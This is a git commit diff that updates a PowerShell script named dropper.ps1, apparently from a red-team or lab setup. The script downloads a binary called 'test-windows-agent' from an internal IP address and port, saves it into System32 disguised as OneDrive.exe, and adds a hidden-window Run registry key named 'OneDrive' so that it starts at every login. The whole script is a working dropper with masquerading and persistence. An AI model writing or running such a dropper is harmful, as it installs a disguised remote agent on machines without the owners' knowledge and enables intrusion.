2d28b7f0a04999d64f03c5dfb4b471d588698d1e
bcvillano <bvillano05@gmail.com>
2026-02-27 00:55:37 -0500

    Update dropper.ps1

--- files/dropper.ps1
+++ files/dropper.ps1
@@ -1,3 +1,3 @@
-$IP = "192.168.1.1"
-Invoke-WebRequest -Uri http://$IP/test-windows-agent -Outfile "C:\Windows\System32\OneDrive.exe"
+$IP = "192.168.1.51"
+Invoke-WebRequest -Uri http://${IP}:8081/test-windows-agent -Outfile "C:\Windows\System32\OneDrive.exe"
 Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "OneDrive" -Value "PowerShell.exe -WindowStyle hidden C:\Windows\System32\OneDrive.exe" -PropertyType String
